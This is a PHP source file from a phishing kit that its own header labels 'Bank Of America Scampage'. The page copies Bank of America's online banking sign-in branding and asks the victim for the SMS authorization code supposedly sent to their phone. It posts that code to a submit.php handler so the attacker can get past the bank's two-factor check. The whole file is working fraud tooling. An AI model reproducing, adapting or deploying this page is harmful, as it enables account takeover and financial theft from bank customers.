<?php
/**
 * @link              https://www.facebook.com/hamidakhatar
 * @since             26/10/2019
 * @package           Bank Of America Scampage
 *
 * Project Name:      Bank Of America Scampage
 * Author:            Hamid Akhatar
 * Author URI:        https://www.facebook.com/hamidakhatar
 */
    include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico" />


        <title>Bank of America | Online Banking | Sign In | Online IDIn</title>
    </head>

    <body>

        <?php
        if( isset($_GET['error']) ) {
            $error = 'color: red';
        }
        ?>
        
        <div id="sms-area">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-5">
                        <div class="title">
                            <h3 style="<?php echo $error; ?>">Authorization Code</h3>
                        </div>
                        <p style="<?php echo $error; ?>" class="mb-3">An authorization code was sent via text to your mobile number.</p>
                        <p style="font-weight: 700; <?php echo $error; ?>">Check your mobile phone and enter the authorization code :</p>
                        <form method="post" action="submit.php">
                            <input type="text" class="form-control" name="sms_code">
                            <input type="hidden" name="type" value="etapsms">
                            <input type="hidden" name="verbot">
                            <button type="submit">Continue</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>